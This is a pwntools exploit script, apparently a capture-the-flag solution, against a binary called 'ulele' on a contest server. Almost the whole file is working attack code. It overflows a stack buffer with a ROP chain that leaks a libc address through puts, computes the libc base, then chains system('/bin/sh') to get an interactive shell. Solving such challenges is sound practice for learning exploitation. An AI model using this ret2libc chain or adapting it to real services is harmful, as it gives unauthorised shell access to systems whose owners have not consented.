#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ulele'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = './libc'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'ctf.gemastik.id', 1313

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401874
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec ulele 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def add(title, name, duration):
    io.sendlineafter(b'choice: ', b'1')
    io.sendafter(b'title: ', title)
    io.sendafter(b'name: ', name)
    io.sendlineafter(b'(in seconds):', str(duration).encode())

def delete(idx):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'delete: ', str(idx).encode())

def view():
    io.sendlineafter(b'choice: ', b'3')

MOV_RDI_RBP_POP_RBP_RET = 0x401792
RET = 0x40101a

def exploit():
    global io
    io = initialize()

    for i in range(99):
        # # fuzz
        # if len(str(i)) == 1:
        #     add(f'{i}'.encode()*0x100, f'{i}'.encode()*0x100, 0x100)
        # else: 
        #     add(f'{i}'.encode()*(0x100//2), f'{i}'.encode()*(0x100//2), 0x100)
        add(cyclic(0x100), cyclic(0x100), 0x1337)
    
    # offset fuzz
    # add(b'A'*0x100, cyclic(0x100), 0x1337)

    offset = 127
    payload = flat({
        offset-8: [ # make space for rbp
            elf.got['puts'], # rbp will be moved to rdi
            MOV_RDI_RBP_POP_RBP_RET, # start of rop chain
            elf.bss() + 0x200, # will popped to rbp
            elf.plt['puts'], # rop chain
            elf.sym['main'] # back to main
        ]
    }, filler=b'\x00', length=0x100)
    add(b'A'*0x100, payload, 0x1337)
    io.sendlineafter(b'choice:', b'4') # trigger rop

    # puts: 0x7f9e06fbff40
    # printf: 0x7fd39c5eeef0
    # libc6_2.37-0ubuntu2.1_amd64

    io.recvuntil(b'program.\n')
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']

    # 2nd stage
    delete(100)

    payload = flat({
        offset-8: [ # make space for rbp
            next(libc.search(b'/bin/sh')), # rbp will be moved to rdi
            MOV_RDI_RBP_POP_RBP_RET, # start of rop chain
            elf.bss() + 0x200, # will popped to rbp
            RET,
            libc.sym['system'], # rop chain
        ]
    }, filler=b'\x00', length=0x100)
    add(b'A'*0x100, payload, 0x1337)
    io.sendlineafter(b'choice:', b'4') # trigger rop

    log.success('leak: %#x', leak)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
